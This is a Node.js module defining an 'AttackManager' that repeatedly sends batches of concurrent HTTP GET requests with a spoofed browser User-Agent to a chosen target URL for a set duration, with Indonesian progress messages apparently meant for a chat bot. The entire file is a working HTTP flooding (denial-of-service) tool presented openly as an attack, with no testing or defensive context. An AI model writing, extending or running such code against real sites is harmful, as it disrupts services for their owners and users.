const axios = require('axios');

class AttackManager {
    constructor() {
        this.isAttacking = false;
        this.attackInterval = null;
        this.requestCount = 0;
        this.successCount = 0;
        this.failCount = 0;
        this.targetUrl = '';
        this.startTime = null;
    }

    async makeRequest(url) {
        try {
            const startTime = Date.now();
            const response = await axios.get(url, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                validateStatus: function (status) {
                    return status < 600; // Resolve all HTTP status codes
                }
            });
            const endTime = Date.now();
            
            this.requestCount++;
            this.successCount++;
            
            return {
                success: true,
                status: response.status,
                time: endTime - startTime,
                data: response.data
            };
        } catch (error) {
            this.requestCount++;
            this.failCount++;
            
            return {
                success: false,
                error: error.message,
                code: error.code
            };
        }
    }

    startAttack(url, duration, callback) {
        if (this.isAttacking) {
            callback('❌ Attack sedang berjalan!');
            return;
        }

        this.isAttacking = true;
        this.requestCount = 0;
        this.successCount = 0;
        this.failCount = 0;
        this.targetUrl = url;
        this.startTime = Date.now();
        const endTime = this.startTime + (duration * 1000);

        callback(`🚀 *ATTACK DIMULAI!*

📊 Target: ${url}
⏰ Durasi: ${duration} detik
🕐 Mulai: ${new Date().toLocaleTimeString()}`);

        // Attack interval
        this.attackInterval = setInterval(async () => {
            if (Date.now() > endTime) {
                this.stopAttack();
                callback(`✅ *ATTACK SELESAI!*

📊 Total Requests: ${this.requestCount}
✅ Berhasil: ${this.successCount}
❌ Gagal: ${this.failCount}
⏰ Waktu: ${((Date.now() - this.startTime) / 1000).toFixed(2)}s
🎯 Success Rate: ${((this.successCount / this.requestCount) * 100).toFixed(2)}%`);
                return;
            }

            // Make multiple concurrent requests
            const requests = [];
            for (let i = 0; i < 5; i++) {
                requests.push(this.makeRequest(url));
            }

            try {
                await Promise.all(requests);
                const elapsed = ((Date.now() - this.startTime) / 1000).toFixed(1);
                
                callback(`📊 *ATTACK PROGRESS*

⏰ Elapsed: ${elapsed}s
📊 Requests: ${this.requestCount}
✅ Success: ${this.successCount}
❌ Failed: ${this.failCount}
🎯 Success Rate: ${((this.successCount / this.requestCount) * 100).toFixed(2)}%`);
            } catch (error) {
                callback(`❌ Error: ${error.message}`);
            }
        }, 2000);

        // Auto stop after duration
        setTimeout(() => {
            if (this.isAttacking) {
                this.stopAttack();
                callback(`✅ *ATTACK SELESAI!*

📊 Total Requests: ${this.requestCount}
✅ Berhasil: ${this.successCount}
❌ Gagal: ${this.failCount}
⏰ Waktu: ${((Date.now() - this.startTime) / 1000).toFixed(2)}s
🎯 Success Rate: ${((this.successCount / this.requestCount) * 100).toFixed(2)}%`);
            }
        }, duration * 1000);
    }

    stopAttack() {
        if (this.isAttacking) {
            this.isAttacking = false;
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
        }
    }

    getStatus() {
        if (!this.isAttacking) {
            return {
                isAttacking: false,
                message: 'Tidak ada attack yang berjalan'
            };
        }
        
        const elapsed = ((Date.now() - this.startTime) / 1000).toFixed(1);
        return {
            isAttacking: true,
            target: this.targetUrl,
            requestCount: this.requestCount,
            successCount: this.successCount,
            failCount: this.failCount,
            elapsedTime: elapsed,
            successRate: ((this.successCount / this.requestCount) * 100).toFixed(2)
        };
    }
}

module.exports = new AttackManager();